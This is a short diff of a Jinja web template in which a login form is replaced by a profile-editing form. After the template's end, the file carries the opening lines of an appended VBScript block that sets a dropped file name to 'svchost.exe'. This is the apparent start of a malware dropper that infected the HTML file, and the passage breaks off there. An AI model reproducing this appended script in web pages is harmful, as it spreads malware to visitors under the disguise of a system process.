@@ -1,15 +1,9 @@
 {% extends "base.html" %}
 {% from "macros.html" import render_form %}
 
-{% block title %}
-Login
-{% endblock %}
-
 {% block body %}
-<div class="form">
-  <h2>登录</h2>
-  {{ render_form(form, url_for('front.login')) }}
-</div>
+<h3>编辑个人信息</h3>
+{{ render_form(form, url_for('user.profile')) }}
 {% endblock %}
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
